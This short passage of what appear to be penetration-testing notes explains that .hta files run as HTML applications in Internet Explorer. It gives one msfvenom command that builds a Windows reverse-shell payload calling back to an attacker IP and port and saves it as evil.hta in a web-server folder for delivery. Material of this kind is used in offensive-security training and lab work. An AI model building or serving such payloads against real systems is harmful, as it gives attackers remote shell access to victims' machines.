## HTML application

.hta instead of html -> will think as html (Only works in internet explorer
1. `sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f hta-psh -o /var/www/html/evil.hta`
